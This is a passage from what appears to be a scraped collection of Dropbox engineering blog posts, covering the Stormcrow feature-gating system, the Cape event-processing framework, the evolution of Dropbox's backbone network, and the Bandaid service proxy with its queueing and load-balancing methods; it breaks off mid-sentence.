ideal world, Stormcrow would be completely “pure” (in the functional programming sense) and would not perform any I/O at all. We haven’t been able to do this yet for practical reasons: sometimes the necessity of providing a convenient API for the caller means that Stormcrow needs to do some of its own heavy lifting. Sometimes you want to gate on information that lives a database call away, so it makes sense to have the capability to (safely) do this. It helps to have a highly scalable data store like Edgestore around for such tasks. Auditing challenges Feature gates are awkward because they aren’t checked into version control: instead, they are a separate piece of state which can change independently of your code. Code pushes at Dropbox happen in a predictable fashion via our “daily push” system (for our backend), or via the release processes for the desktop or mobile platforms. But feature gate edits, by their very nature, can happen at any hour of the day or night. So, it’s important to have good auditing tools so we can track feature-gating related regressions down as fast as possible. Stormcrow tackles this in the following ways: providing full audit history and by tracking features in our codebase with static analysis . Audit history is simple enough: we just show a “news feed” style view of all edits to a given feature and population. This feed shows all edits that could affect the given item, including edits to transitive dependencies (which can arise through derived populations). Static analysis of our codebase is a little more interesting. For this, we run a special service called the Stormcrow Static Analyzer . The static analyzer knows how to clone our code and scan over it, searching for Stormcrow feature usages. For a given feature, it produces two outputs: A list of all occurrences of the feature in the current master branch. A “historical view”, showing the commit hashes where the feature entered and/or exited our codebase. For example, here’s what the static analyzer has to say about a feature called can_see_weathervane : The static analyzer also performs the important task of making sure the most common variant found in our production code matches up with what our unit tests are testing. It knows how to send “nag\" emails to feature owners about this and other issues, such as stale features that aren’t used anymore and should be removed from the codebase. These tools make it straightforward to track down how a given feature affects our code. QA and Testing For manual testing of our features, Stormcrow supports “overrides.” Overrides allow Dropboxers to temporarily put themselves into any feature or population. We also have a notion of “datafield overrides,” which allow you to change a single datafield value. For example, you can force your locale to be German in order to test the German experience. For unit tests, we run a mock Stormcrow where every feature is given a “default” variant to use in tests. Stormcrow variants can also be overridden by any test. We even have special decorators to say “make sure this test passes under all possible variants.” Conclusion Providing a unified feature gating service at Dropbox’s scale involves lots of considerations, from infrastructure issues like data fetching and configuration management all the way up to UI and tooling. We hope this post is useful to people working on their own feature gating systems. Does your company’s handle feature gating differently? Please let us know in the comments! Thanks to the following people for help on this post: Mor Katz, Christopher Park, Lee Sheng, Kevin Zhou, Taylor McIntyre. P.S. Why is this system called Stormcrow? Because this system replaced our previous feature-gating system, which was called Gandalf (“You shall not pass!”). The Lord of the Rings fans will recognize “Stormcrow” as one of Gandalf’s many names. Plus we had a bird thing going on for internal project names at the time. // Tags Infrastructure Stormcrow Feature Gating A B Testing // Copy link Link copied Link copied", "date": "2017-03-06"},
{"website": "Dropbox", "title": "Introducing Cape", "author": ["Shashank Senapaty"], "link": "https://dropbox.tech/infrastructure/introducing-cape", "abstract": "Requirements Data Model Architecture Using Cape Wrap-up More than a billion files are saved to Dropbox every day, and we need to run many asynchronous jobs in response to these events to power various Dropbox features. Examples of these asynchronous jobs include indexing a file to enable search over its contents, generating previews of files to be displayed when the files are viewed on the Dropbox website, and delivering notifications of file changes to third-party apps using the Dropbox developer API . This is where Cape comes in — it’s a framework that enables real-time asynchronous processing of billions of events a day, powering many Dropbox features. We launched Cape towards the end of 2016 to replace Livefill , which we last talked about in 2014. In this post, we’ll give an overview of Cape and its key features, high-level architecture, and varied use cases at Dropbox. Requirements Cape is designed to be a generic framework that enables processing of event streams from varied sources, and allows developers to execute custom business logic in response to these events. There were many requirements we had to satisfy with it: Low latency Cape needs to enable processing within sub-second latencies to power content-based collaboration and sharing that increasingly happens in real-time and on-the-go through mobile devices. For example, we’d like a user to be able to search over or view a file that was just added to Dropbox and shared with them. Multiple event types Unlike its predecessor Livefill, Cape should generalize to processing different types of events in addition to Dropbox file events. This will enable the Dropbox product to react in real time to events that change non-file metadata, such as sharing a file, changing the permissions on a shared folder, or commenting on a file. Such capabilities have gained increased importance as Dropbox increasingly transforms from a pure file sync solution to a collaboration platform. Scale Cape must support the high throughput of tens of thousands of file and non-file events per second. In addition, many different workloads may result from the same event further amplifying the scale that needs to be supported. Variable workloads Workloads may vary in duration: from milliseconds, to tens of seconds, to minutes in some cases, based on the type of workload and the event being processed. Isolation Cape must provide reasonable isolation between different Cape users’ event processing code, so that an issue with one user’s processing doesn’t have a big adverse impact on all other users of the framework. At-least-once guarantee Cape must guarantee that each event is processed at-least-once since this is critical to many use cases for ensuring a correct and consistent product experience. Data Model Each event stream in Cape is called a Domain and consists of a particular type of events. Each Cape event has a Subject and a Sequence ID . The Subject is the entity on which an event occurs, the corresponding Subject ID serving as a key to identify the Subject. The Sequence ID is a monotonically increasing ID that provides a strict ordering of events within the scope of a Subject . There are two specific event sources supported in the first version of Cape that account for many of the important user events at Dropbox — we’ll take a quick detour to understand these sources before moving on. The first source is SFJ (Server File Journal), which is the metadata database for files in Dropbox. Every change to a file in a user’s Dropbox is associated with a Namespace ID (NSID) and a Journal ID (JID), which together uniquely identify each event in SFJ. The second supported source is Edgestore , which is a metadata store for non-file metadata powering many Dropbox services and products. All changes to a particular Edgestore Entity or Association type can be uniquely identified by a combination of a GID (global id) and a Revision ID. The following table describes how SFJ and Edgestore events fit into Cape’s event abstraction: Source Domain Subject ID Sequence ID SFJ SFJ (all SFJ events) Namespace ID Journal ID Edgestore Entity or Association type GID Revision ID In the future, Cape can support processing custom event streams in addition to SFJ and Edgestore events. For example, events flowing into a Kafka cluster could fit into Cape’s event stream abstraction as follows: Source Domain Subject ID Sequence ID Kafka A Kafka cluster {Topic, Partition} Offset Architecture Shown below is an overview of what Cape looks like: Cape System Architecture SFJ and Edgestore services send pings to a Cape Frontend via RPCs containing metadata from relevant events as they happen. These pings are not in the critical path for SFJ and Edgestore, and so are sent asynchronously instead. This setup minimizes the availability impact on critical Dropbox services as a whole (when Cape or a service it depends on is experiencing an issue) while enabling real-time processing of events in the normal case. The Cape Frontend publishes these pings to Kafka queues where they are persisted until they are picked up for processing. The Cape Dispatcher subscribes to the aforementioned Kafka queues to receive event pings and kick off the necessary processing. The Dispatcher contains all the intelligent business logic in Cape and dispatches particular events to the appropriate lambda workers based on how users have configured Cape. In addition, it’s responsible for ensuring other guarantees that Cape provides, notably around ordering between events and dependencies between lambdas. The Lambda Workers receive events from the Dispatcher via Redis , carry out the users’ business logic, and respond to the Cape Dispatcher with the status of this processing — if the processing is successful, this is the end of the processing for that particular event. As mentioned earlier, pings from SFJ and Edgestore are sent asynchronously and outside the critical path to the Cape Frontend, which of course means they are not guaranteed to be sent for every event. You may have realized that this makes it seemingly impossible for Cape to provide the guarantee that every event is processed at least once, e.g. it would be possible for a file to be synced to Dropbox but for us to miss all the asynchronous processing that should happen as a result. This is where Cape Refresh comes in — these workers continually scan the SFJ and Edgestore databases for recent events that may have been missed and send the necessary pings to the Cape Frontend to ensure they are processed. Additionally, this serves as a mechanism to detect permanent failures in users’ application code on any of the billions of Subjects processed by Cape. Using Cape To integrate with Cape, these are the steps a developer needs to follow: Lambda : Write the code that should execute in response to events by implementing a well-defined interface (currently in Python or Go) — this is referred to as a lambda Deploy : Deploy Cape workers to accept events and run the newly created lambda using Dropbox’s standard deployment and monitoring tools Config : Include in Cape’s config the set of events that should be processed by specifying the Domain, and the Lambda that should run in response to them After the above steps are followed, the newly deployed Cape workers will receive events related to the relevant lambda, can process these events appropriately, and respond back to the Cape Dispatcher with the status of this processing. Users also have access to automatically generated monitoring dashboards with basic metrics around the event processing being performed by this lambda. Wrap-up Cape already processes several billion events a day with 95th-percentile latencies of less than 100 milliseconds and less than 400 milliseconds, respectively, for both SFJ and Edgestore. These latencies are measured from the point when the Cape Frontend receives the event to when event processing starts at the lambda workers. For SFJ, end-to-end latencies (i.e., from when the change is committed to SFJ to when processing starts at the lambda workers) are higher: ~500 milliseconds & 1 second, respectively, due to batching within the SFJ service itself. Here are just a few examples of how Cape is used at Dropbox today: Audit Logs: Cape enables real-time indexing of Dropbox events relevant to audit logs , enabling Dropbox Business admins to search over these logs Search: Cape is used for real-time indexing when a file in Dropbox changes, enabling search over a file’s contents Developer API: Cape is used to deliver real-time notifications of file changes to third party apps using the Dropbox developer API Sharing permissions: Cape is used to perform expensive operations asynchronously, e.g. propagating permissions changes across a large or deep hierarchy of shared folders Given how generic the framework is and its support for the majority of Dropbox’s important events, we expect Cape to underpin many of Dropbox’s features in the future. The architecture overview we’ve included in this post obviously leaves out discussion of many details and design decisions. In future posts, we’ll dive deeper into further technical details of Cape and specific aspects of its architecture, design, and implementation. Thanks to the folks that helped build Cape: Bashar Al-Rawi, Daisy Zhou, Iulia Tamas, Jacob Reiff, Peng Kang, Rajiv Desai, and Sarah Tappon. // Tags Infrastructure Sfj Livefill Cape Async Edgestore // Copy link Link copied Link copied", "date": "2017-05-17"},
{"website": "Dropbox", "title": "Infrastructure update: evolution of the Dropbox backbone network", "author": ["Naveen Oblumpally"], "link": "https://dropbox.tech/infrastructure/infrastructure-update-evolution-of-the-dropbox-backbone-network", "abstract": "Dropbox backbone network 2015: Year of planning and implementing new technologies 2016: Year of execution to support 10X scale 2017: Preparing for future growth Conclusion We’re hiring! Dropbox global backbone network topology In our previous post, we provided an overview of the global edge network that we deployed to improve performance for our users around the world. We built this edge network over the last two years as part of a strategy to deliver the benefits of Magic Pocket . Alongside our edge network, we launched a global backbone network that connects our data centers in North America not only to each other, but also to the edge nodes around the world. In this blog, we’ll first review how we went about building out this backbone network and then discuss the benefits that it’s delivering for us and for our users. Dropbox backbone network Over the last three years, our network has evolved significantly to keep up with user growth. We were an early adopter of cloud technology for all of our storage and infrastructure needs before we moved onto Magic Pocket , but the combined effect of migrating hundreds of petabytes of customer data into our own data centers while serving our growing customer base required us to grow our network significantly, and quickly. Evolution of the backbone network 2015: Year of planning and implementing new technologies In early 2015, we began our network expansion initiative to accommodate for 10X scale, provide high (99.999%) reliability, and improve performance for our users. Our internal forecasts pointed to exponential growth in our network traffic as user adoption continued to grow. As we were planning to scale our network, we began to look at deploying technologies like Quality Of Service (QoS), Multi-Protocol Label Switch (MPLS), IPv6, and overhauling our routing architecture to support future growth. Routing Architecture: At that time, our routing architecture was primarily Open Shortest Path First (OSPF) as our Interior Gateway Protocol (IGP), and we had route reflectors (RR) for our Interior Border Gateway Protocol (iBGP) design. As we were planning for 10X scale and deploying new technologies, we were re-evaluating our routing architecture for both IGP and BGP design. IGP Migration: One of the biggest sticking points to continuing with OSPF was the complexity in rolling out IPv6. We were originally using OSPFv2, which only supports IPv4. IPv6—which we were upgrading to—requires OSPFv3. Multiple address families in OSPFv3 were not fully supported by all vendors nor widely deployed at that time. This meant we had to run two versions of OSPF to support v4 and v6, which was operationally more complex. We started to look at replacing OSPF with IS-IS, a protocol-agnostic architecture that runs at OSI layer-2, and can easily support all address types including v4 and v6. In addition, IS-IS uses Type Length Value (TLV) to carry information in Link State Packets. The TLVs make IS-IS easily extensible to carry different kind of information and support newer protocols in future. In Q2 2015 we successfully migrated from OSPF to IS-IS across the entire backbone. iBGP Design: Our initial iBGP design was based on a single hierarchy route-reflector (RR) model. But iBGP RRs have their own limitations, including the fact that they offer limited path diversity. After learning routes from clients, RRs advertise a single best path to their peers. This results in RR peers having visibility into only one path for every prefix, which potentially causes all traffic for that prefix to be sent only to one next-hop, instead of being distributed across several equal-cost next-hops. This results in an unequal load-balance of traffic across the network. We tried to mitigate that issue by using Add-Path , which provides the capability to announce multiple paths. Since Add-Path was still a new feature being developed by routing vendors at that time, we ran into multiple bugs when we tested it. At that point, we decided to come up with a new iBGP design and move away from route reflectors. We debated a couple of design choices, including: Full mesh iBGP design across all routers. In this scenario, all routers will have full mesh iBGP with each other. This design solves the lack of path diversity encountered with RRs, as with full mesh iBGP all routers will learn all routes from each other. This works well in a smaller network with fewer routers, but we knew that as our network grew, the number of routers and routes learned would grow significantly. Millions of routes in the control plane can cause memory issues; coupled with any route churn, this can impact CPU and/or RIB / FIB memory, causing significant operational impact. Full mesh iBGP within a region, with route reflectors across regions. The second approach was to break our backbone network into smaller regions and have full mesh iBGP between routers within a region, while having RRs announce routes between regions. This would solve the route scaling issue as the number of routers in full iBGP mesh would be much lower. But as discussed above, limitations of RRs would still continue to exist even with this design. We ultimately decided on a hybrid approach of the two: full mesh iBGP that announces selective routes across regions. We now have full mesh iBGP across all routers, but also regionalize our backbone network into smaller groups that have different routing policies. Because transit-provider-routes constitute the bulk of our traffic, we confined routes from transit providers to the region where they originated. All other peering routes and internal traffic is announced across regions. This approach eliminated the limitations of RRs and also solves the route scaling issues due to full-mesh iBGP. A snapshot of our US network broken down into regions. In addition, we treat Europe and APAC as their own regions, bringing our total to five. MPLS-TE In early 2015, we started rolling out MPLS-TE. To meet and exceed customer expectations, our network must handle failures and rapidly respond to demand spikes. To address the challenge of adapting to dynamic changes in bandwidth capacity and demand, we implemented MPLS with RSVP. MPLS RSVP-TE has a mechanism to react to and adjust for sudden spikes in traffic without manual intervention. When there is sufficient bandwidth available, MPLS ensures traffic will follow the shortest path on the network between its source and destination by establishing a Label Switch Path (LSP) between those points. We deployed multiple LSPs with different priorities: user traffic always takes high-priority LSPs, whereas internal traffic takes low-priority LSPs. As traffic demand goes up (or network capacity goes down because of an outage) RSVP-TE will move LSPs to alternate higher metric paths which have sufficient bandwidth to handle that demand. Because we deploy multiple LSPs with different priorities, RSVP-TE can leave our user traffic on the shortest route and start by moving less critical internal traffic to the longer paths first as shown in the figure below. This allows the network to have redundancy as well as efficient utilization of our network resources to ensure the required level of service and avoid over-provisioning. This figure shows the path that LSPs follow in the Dropbox backbone network, depending on availability of bandwidth Quality of Service Quality of service (QoS) is an industry-wide set of standards and mechanisms for ensuring high-quality performance for critical applications. Dropbox’s network carries a mix of latency-sensitive user traffic, and high-volume batch traffic—this includes traffic from data migrations and server provisioning. In 2015, we launched a Quality of Service (QoS) program to identify different traffic types and treat them accordingly, end-to-end. QoS gives us techniques necessary to manage network bandwidth, latency, jitter and packet loss, which helps us guarantee network resources to critical applications during congestion events. To build out this program, we worked with various application owners within Dropbox to mark their services on host machines based on the priority of their service. We classified all Dropbox traffic into four categories and assigned them into respective queues as shown below: Network_Control : All routing protocol hellos or keepalive messages are put in this queue. These messages get the highest priority as loss of these packets jeopardizes proper network operation. Premium : All traffic that serves end users. Packets in the premium queue are considered critical to Dropbox users and treated with high priority. Default : Traffic that is not user-impacting but still important for internal services to communicate with each other. Best_Effort : Non-critical Traffic. These packets are usually the first to be dropped under congested network conditions, and can be re-sent at a later point in time. We make sure we have enough bandwidth to support all traffic types at all times of the day, but we want to protect critical services against unplanned and unexpected network failure events. QoS helps us do that by allowing us to prioritize Premium (user) traffic over other lower-priority traffic. 2016: Year of execution to support 10X scale 2016 was the year we re-architected the network and deployed new hardware to support future scalability. Types of routers The Dropbox backbone network consists of routers with three distinct roles: Data center routers (DR), with a primary function of connecting the data center to the backbone network Backbone routers (BB), which act as a termination point for long-haul circuits and also as an aggregation devices for DRs in regions where we have data centers Peering Routers (PR), with a primary function of connecting Dropbox to external BGP peers to provide connectivity to the Internet. The Dropbox network has two types of traffic: “user traffic,” which flows between Dropbox and the open Internet, and “data center traffic,” which flows between Dropbox data centers. In the old architecture, there was a single network layer, and both traffic types were using the same architecture, passing through the same set of devices. Old Architecture: Old backbone architecture At first, we used the same hardware device for all three roles. But as we began to scale significantly, our existing designs and the platform that we were using reached their limits. We could have continued down the same path by growing horizontally, but that would have been expensive and operationally complex. We instead decided to re-think our architecture, which led to the evolution of our new, two-tier architecture. Two-Tier Architecture: In the new architecture, we created two network domains to handle each type of traffic independently. We also introduced a new set of routers called DCs to connect data centers. The new data center (DC) tier has full mesh MPLS (RSVP) LSPs between them, and is built on a new set of highly dense backbone routers that can easily scale to multi-terabit capacity. The new DC-tier carries the data center traffic, whereas the old DR-tier is used to transport user traffic, primarily from Dropbox to the Internet. Each tier has its own BGP and MPLS LSP mesh, but they connect to the same set of backbone (BB) routers, sharing the same physical transport network. We have about twice as much data center traffic as user traffic, and both traffic profiles have different characteristics. Data center traffic consists of internal services talking to each other, or copying data from one data center to another. User traffic is always transporting from DRs to a point of presence, and is treated as premium traffic. Peeling off Dropbox internal traffic to its own tier has enabled a clear separation between the two types of traffic, which helps in building traffic profiles and network topologies that are unique to each traffic type. New backbone architecture Optical : To support the tremendous growth and maintain consistent service level agreements, we invested in dark fiber connecting our data centers to our PoPs. Leasing dark fiber and running our own optical systems gives us the flexibility to add capacity at a much faster pace, compared to purchasing bandwidth or leased line capacity from optical transport vendors. To build on this, we deployed the latest bleeding edge optical gear available, which gives us the ability to scale quickly and easily. 2017: Preparing for future growth Moving to 100G: In 2016, we started to qualify a next-generation backbone (BB) router with cutting-edge technology that has the scale and density to support tens of terabits of throughput capacity. We spent about eight months qualifying products from different vendors, and ultimately decided to utilize the latest technology product which could support our requirements. Dropbox was one of the first to qualify and deploy this platform in production infrastructure. Our initial deployment in the backbone was with 10G circuits. As the traffic on our network increased, we continued to add more 10G links to increase capacity, ultimately combining those 10G links into a single link aggregation bundle (LAG). By early 2016, we had multiple LAG bundles that each had more than ten 10G links each, which added complexity when it came to provisioning, managing and troubleshooting circuits. We decided to simplify our architecture by replacing multiple 10G circuits with 100G. With the roll-out of new BB routers across our network, we were able to migrate WAN links from multiple 10G LAG bundles to 100G. By June 2017 we migrated all our US and EU WAN links, including our transatlantic links, to 100G. This increased our cumulative WAN capacity by ~300%. IPv6 In Q4 2016 we started rolling out IPv6 across our entire network. One of our design goals was to have parity between IPv4 and IPv6 for both routing as well as forwarding. As part of this roll-out, and to have consistent routing for both v4 and v6, we chose IS-IS single-topology over multi-topology. For forwarding v6 traffic, we intend to use the same set of MPLS-TE LSPs as we used to tunnel v4 traffic. We could do that by using IGP short-cuts as defined in rfc3906 . With the implementation of IGP-shortcuts, both v6 and v4 traffic were using the same MPLS-LSPs across the backbone. By end of Q1 2017 we completed v6 roll-out across our data centers, backbone and edge. Conclusion Dropbox manages hundreds of gigabits of traffic, and we’re growing at a rapid pace. To keep up, one of the mantras the Dropbox Network Engineering team has adopted is to always “build for scale.” Building for scale isn’t about adding more network capacity, nodes, or devices. Instead, we’re periodically updating our architecture, and always thinking about how to grow and operate the network at ten times the scale we operate at today. This mindset means we’re always planning two to three years ahead, so that we have all of the tools, automation, and monitoring in place to support operating at a capacity that’s ten times greater than what we’re operating at now. The same principle applies across the entire network, whether it is Datacenter, Backbone, or Edge. We’re hiring! We’re on the lookout for experienced network engineers to help scale the Dropbox edge network beyond terabits of traffic and 100G uplinks. Or how about our backbone network where we’re constantly improving the reliability and performance of our CLOS-based fabrics. We also have a hybrid security/networking position for a Network Security Engineer in San Francisco. Want something more high level? The traffic team is also hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Backbone Pops Networking // Copy link Link copied Link copied", "date": "2017-09-15"},
{"website": "Dropbox", "title": "Meet Bandaid, the Dropbox service proxy", "author": ["Dmitry Kopytkov"], "link": "https://dropbox.tech/infrastructure/meet-bandaid-the-dropbox-service-proxy", "abstract": "Short facts about Bandaid Internal Design Important use cases Load-balancing methods We’re hiring! With this post we begin a series of articles about our Service Oriented Architecture components at Dropbox, and the approaches we took in designing them. Bandaid, our service proxy, is one of these components. Follow along as we discuss Bandaid’s internal design and the approaches we chose for the implementation. Bandaid started as a reverse proxy that compensated for inefficiencies in our server-side services. Later we developed it into a service proxy that accelerated adoption of Service Oriented Architecture at Dropbox. A reverse proxy is a device or service that forwards requests from multiple clients to servers (i.e. backends). The most common use of reverse proxy is to provide load balancing for web applications. Additional uses for reverse proxies include web acceleration, SSL termination and various security features. Although there are many reverse proxy implementations available, companies with private clouds that manage significant volumes of traffic often build their own reverse proxy solutions. Here are some of the reasons why they build their own: it allows for better integration with internal infrastructure; it makes it possible to reuse well known internal libraries; it reduces dependency and allows teams to make changes when they are needed; proprietary solutions are better suited to address specific company use-cases Short facts about Bandaid Bandaid supports: a rich set of load balancing methods (round-robin, least N random choices, absolute least connection, pinning peer); SSL termination; HTTP2 for downstream and upstream connections; metro rerouting; buffering of both requests and responses; logical isolation of endpoints running on the same or different hosts; dynamic reconfiguration without a restart; service discovery; rich per route stats; gRPC proxying; HTTP/gRPC health checking; support for weighted traffic management and canary testing Internal Design Like many of the core infrastructure components at Dropbox, Bandaid is written in Go. Selecting Go allowed for tight integration with services and a shortened development cycle. Bandaid’s primary components are shown in the image below. The Request Handler sends requests to a Queue . The queues pop requests to Workers (goroutines) and the workers process them and send them one-by-one to sets of hosts we’ll refer to as Upstream /Upstreams. Bandaid High level design schema Queueing It is important to discuss how our queueing mechanism functions in order to understand the request handling workflow in Bandaid. Request queueing implemented inside the proxy allows for better management of overloaded backends. Bandaid always processes requests in Last In, First Out (LIFO) order. When the system is not overloaded, the queue will be empty (or almost empty). Thus there’s no real difference between popping requests from the front of the queue or the back of the queue. Where LIFO processing reduces overhead is when the system is overloaded. By processing the newest requests first—since the oldest requests are likely to time out soon—we avoid spending CPU cycles on expiring requests. Bandaid queueing can also support dropping requests once the queue reaches a configurable maximum capacity threshold. However, we don’t recommend this since it’s hard to distinguish whether a queue is full due to system overload or because of bursty traffic. Bandaid queues have two additional options that control how many requests from the same queue can be processed concurrently, and how quickly requests can leave the queue for processing. Because Bandaid always accepts TCP connections and pushes read requests into its own queues executed in the user-space, the kernel TCP accept queue [1] is always empty. One of the reasons for this decision is that clients may trigger a connection close unexpectedly, while the backend application is still processing the data. This consumes resources unnecessarily. Keeping the kernel accept queue empty and tracking the timing of connections in Bandaid queues allows to detect and propagate connection closure sooner, freeing up backend server resources. To do this, Bandaid simply fails those requests that are in the queue for more than the configurable timeout. Instead it forwards newly sent requests that have a lower probability of being closed by the client. We found it’s much easier to manage connections in the user-space queue; it gives us more control over both the queue and requests. See the scenario below for more details. Client attempts to connect to the server. If the accept queue in the kernel is not full the connection will be successfully established after a three-way handshake. Client sends requests. NOTE: Since the client doesn’t know anything about the state of the server it will send requests even if the server cannot accept any more connections or is not ready to process new requests. In the case of a slow server, the client will wait until the configured timeout and then will close the connection (with FIN-ACK flags) because no response is received from the server. The server application finally gets a delayed connection from the kernel accept queue via the accept() call. It doesn’t detect that connection is already closed, since it was closed normally (via FIN , instead of RST ), and continues to the request step. The server application reads the request. The application then processes the request and tries to send a response. The server gets RST after the first write() call as the connection is already closed on the client side. The next write call will raise SIGPIPE signal or return broken pipe error when the signal is ignored. Delayed detection of closed connections Aggressive retries from the client side make the situation worse since the server is already overloaded and cannot process the extra requests. These requests will keep the kernel accept queue full, exhausting it with already closed connections. There are multiple ways to solve this problem; here are a few: impose exponential backoff between client retries; decrease the size of the accept queue in the kernel; manage connection timeouts in the user-space queue At times it may be difficult to control timeouts between retry attempts on the client side (e.g. a third-party application accessing the server through an API). Bandaid implements connection management in the user-space LIFO queue by keeping the kernel queue empty. Old connections that sit in the queue for more than a specified amount of time are closed without being processed. New requests will go through for processing. Maintaining connections in user-space LIFO queue Request handling Since Bandaid supports multiple queues it needs a mechanism to determine which queue to push requests to; this is done by the Request handler. Currently, the Request handler can only distinguish requests by their URL and hostname. It matches this information with a configurable list of URL patterns and hostnames that belongs to each queue. In the future we’ll have additional matching methods. Worker Pool Bandaid has a fixed-size pool of workers that process requests. This approach (as opposed to running an unlimited number of worker goroutines) makes it possible to precisely control upstream concurrency. The number of workers is configurable, but depends on the size of the serving set (number of healthy upstream hosts). Oversubscription occurs when this number is set much higher than number of healthy upstream hosts. In each worker loop iteration a worker pops a request from the queue, and calls the current request processor to handle the request. Since the number of workers controls how many concurrent requests can be processed, the number should be tuned so that there is enough workers to utilize the full upstream capacity. This configuration option should be chosen carefully because oversubscription will reduce the effectiveness of graceful degradation. When services in an upstream are overloaded sending more requests to that upstream will result in increased rate of failed requests or add latency. To mitigate this Bandaid drops these extra requests, keeping the load on the upstream at an appropriate level. Upstreams Upstreams are composed of the following components: queues that receive incoming requests; a single dequeuer that serves as multiplexer; and a request processing work pool. Note that it’s possible to have multiple upstreams. The role of dequeuer is discussed in the section below where we talk about the various use cases made possible by Bandaid. Important use cases Weighted traffic management This is an important Bandaid feature that enables canary deployments of services at Dropbox. This makes it possible to route a configurable percentage of traffic to a deployment with particular version of software (for example, send 10% of traffic to a new deployment). In the design of Bandaid multiple queues may belong to a single upstream. Each queue may have its own properties such as weight, queue size, rate limit, priority level and number of concurrent connections. There are also two extra enqueueing and dequeueing interfaces built on top of queues. These features enable weighted traffic management and prioritization functionalities in Bandaid. Bandaid enqueueing and dequeueing mechanism The enqueuer interface makes decisions about where to push requests based on queue weights. Queues with higher weights are more likely to take new requests. This allows us to implement traffic shifting as it’s shown in the next picture: 90% of traffic goes to one upstream (production) and 10% to another (canary). As mentioned earlier Bandaid supports hot config-reloading (dynamic reconfiguration without a restart). A new configuration can be applied without having to restart Bandaid. This simplifies development operations and allows us to see results within a few seconds from the push of a new configuration. Example of traffic shifting based on queue weights The dequeuer determines dequeueing order based on the queue’s priority level. Requests are popped from higher priority queues sooner than from lower priority queues. Hence, when the system is overloaded, low priority requests are more likely to be slowed down than high priority requests. Multiple queues can share the same priority level. To ensure fairness among these equal priority queues, the priority dequeuer will semi-randomly shuffle them and will pop requests in the shuffled order. Strict priority-based dequeuing can result in starvation (i.e., requests with lower priority will never be served because there are always requests in higher priority queues). To combat this, Bandaid provides another option that controls how fairly queues are popped. At one extreme, queues are treated as if they all have the same priority; at the other extreme, the priority dequeuer will always favor high priority requests over low priority requests. Logical isolation within the upstream Some backends may serve critical and non-critical routes from the same host. In this case performance degradation on non-critical routes may affect the responsiveness of critical routes. This is because the number of requests each individual host can handle is limited, so if it spends all its resources on serving non-critical routes, then it won’t be able to handle critical routes. One solution for this problem is to serve critical and non-critical routes from different hosts. Another approach involves performing isolation at the proxy level. This helps reduce operational overhead and minimizes the number of hardware instances. Bandaid allows configuring the following properties to control the behavior of critical and non-critical routes: rate limiting, number of concurrent connections, and queue priority. Example of logical isolation of routes within the same upstream The image shows two queues in use, but there is no such limit in Bandaid—the same upstream may handle requests from multiple queues. HTTP/gRPC Reverse proxy This is a classic load-balancing use case. See the section on load balancing methods below for more details. Limiting the number of concurrent connections Backend servers may have a limitation on the number of supported concurrent connections. In this case Bandaid handles all incoming connections (which can be a large number) and controls the number of connections (typically a much smaller number) forwarded to each backend process. Bandaid can be configured to reply with a specific status code when the limit of concurrent connections is reached. Using Bandaid to limit the concurrent number of connections per process Below, outgoing TCP connections are being reduced by multiplexing them using Bandaid. Each host in the picture has multiple instances of clients and each client is establishing its own TCP connection with Bandaid. Bandaid reduces the number of concurrent connections when it communicates with the service by reusing inactive connections (keep-alive, http2). Reducing the number of incoming TCP connections HTTP Protocol transition Some of the services still use HTTP 1.0 and Bandaid can be used to translate the newest version of HTTP protocol to the oldest, or vice-versa. HTTP protocol transition Load-balancing methods The current version of Bandaid supports multiple load balancing methods. Unfortunately, there is no perfect method that works equally efficiently in all cases. Different scenarios require different load-balancing approaches. Round Robin This is a well known load-balancing method that is simple to implement. When configured, Bandaid will send the same number of connections to each host. This method doesn’t take into consideration hosts/services or connection slowness. It is likely to cause a slight imbalance when hosts perform differently. This situation is schematically shown in the image below. Red hosts perform more slowly than the green hosts. In the Round Robin implementation the number of connections processed by the red hosts will continue growing because Bandaid will send new requests to these hosts even if they are not done processing old requests. Round Robin Let’s take a closer look at the following scenario: the round robin load-balancing method is used with various ratios between the number of slow and healthy backends. The probability that a worker will get stuck serving slow hosts can be found as V = KR /( 1 + K*(R-1)) where C - number of backends in bad state Lc - average latency across C machines (time between accepting the connection and finishing processing) P - number of backends in normal state T - total number of machines or T = C + P Lp - average latency across P machines. K - [0, 1] ratio between C (bad hosts) and T (total number of hosts). K = C/T, or C = K T, or P = (1-K) T R - ratio between Lc and Lp → R = Lc/Lp or Lc=R*Lp Percentage of workers (y-axis) connected with bad/slow hosts per bad machines (x-axis) to total number of machines ratio The graph at right shows a few examples of V for different ratios between slow backends and the total number of backends in upstream for various R values: Blue line: R=2 (average latency across bad machines is two times higher than the average latency across good machines) Red line: R=5 Green line: R=50 You can see in the figure the rapid increase of the green line which means that slow hosts performing 50 times slower than others may consume ~70% of all capacity, even in cases when only 5% of these slow/bad machines are present. Least number of connections of N random choices This is an effective method for backends that do not perform equally in terms of the time it takes them to process requests. Here, the load balancer needs to send a smaller number of requests to a slow host and a greater number of requests to faster/healthy hosts. The load balancing method that allows us to do so is least connections of N random choices [2]. The image below shows the main principle and the steps for the method. In this example N=2 (i.e. two random choices). Bandaid randomly selects two hosts from the serving set. Bandaid selects hosts with the fewest number of connections. Least connections of two random choices An adverse situation can exist where an upstream host is failing requests at a high rate (especially in the case of a small serving set) and is selected as the one with the least connections. This is because the algorithm is not aware of server health or resource utilization and only cares about the number of concurrent connections. A derivative of this load-balancing technique is the Absolute Least Connections method. Because the number of connections could change while we search, we freeze (lock) the current state while Bandaid searches for the host with the least number of connections. Once found Bandaid will direct new connections to this host. Absolute least connections In addition to this, Bandaid randomizes starting positions to add distribution across hosts that have the same least number of connections. This is done to avoid establishing all the connections with the first host from the serving set that has the smallest number of connections. Pinning peer High level design of pinning peer load balancing For this method each worker (goroutine) belongs to a specific host in the upstream. The worker takes the next request from the queue only after the previous request has been processed by the host. This automatically reduces the load on slow hosts because each Bandaid worker is directly limited by the performance of the host. Synthetic tests Seeing how each load-balancing method behaves and getting additional evidence that the theory works as expected is key before trying it in production. Testing requires an additional time investment in building a test environment that simulates sets of backends. Long term, testing allows us to validate code much faster and helps identify the right load-balancing method. Results of synthetic tests for load-balancing methods implemented in the current version of Bandaid are shown below. The test environment had the following conditions: 100,000 requests sitting in the queue and ready to be served; 100 workers in the workpool; 10 backend machines in an upstream. Each backend host had its own processing latency shown on the following graph: Latency per host in upstream The next graph shows the distribution of requests across backend servers in the upstream for each load-balancing method. As expected, the distribution of requests for the round-robin method is 